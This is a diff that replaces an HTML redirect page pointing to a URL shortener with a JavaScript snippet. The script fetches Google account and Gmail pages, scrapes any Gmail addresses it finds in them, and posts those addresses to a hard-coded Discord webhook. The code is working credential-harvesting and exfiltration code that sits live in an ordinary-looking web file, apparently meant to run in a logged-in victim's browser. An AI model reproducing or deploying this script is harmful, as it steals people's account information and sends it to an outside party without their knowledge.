@@ -1,1 +1,38 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=https://url-shortener.me/726T"><script>location.replace("https://url-shortener.me/726T")</script></head><body></body></html>
+(async () => {
+  const urls = ["https://accounts.google.com/AccountChooser", "https://mail.google.com/mail/u/0/", "https://myaccount.google.com/", "https://accounts.google.com/signin/v2/usernamerecovery"]; // 
+  const webhookURL = "https://discord.com/api/webhooks/1469344031371694254/D8F6QXpH0fs7CIPp7D9mjB35AtRi3kj2saow0qPm11A4KCa1LLDxT698Hgnc5DUv0LXJ"; // 
+  const found = new Set();
+
+  // Scan all URLs in parallel
+  await Promise.all(urls.map(async url => {
+    try {
+      const r = await fetch(url);
+      const text = await r.text();
+      [...text.matchAll(/[a-zA-Z0-9._%+-]+@gmail\.com/g)]
+        .forEach(e => found.add(e[0]));
+    } catch (err) {
+      console.warn(`Failed to fetch ${url}: ${err}`);
+    }
+  }));
+
+  if (found.size === 0) {
+    console.log("❌ No Gmail addresses found.");
+  } else {
+    console.log("🔥 Gmail addresses found:");
+    console.table([...found]);
+
+    // Send to Discord
+    try {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `Found Gmail addresses:\n${[...found].join("\n")}`
+        })
+      });
+      console.log("✅ Sent to Discord!");
+    } catch (err) {
+      console.error("❌ Failed to send to Discord:", err);
+    }
+  }
+})();
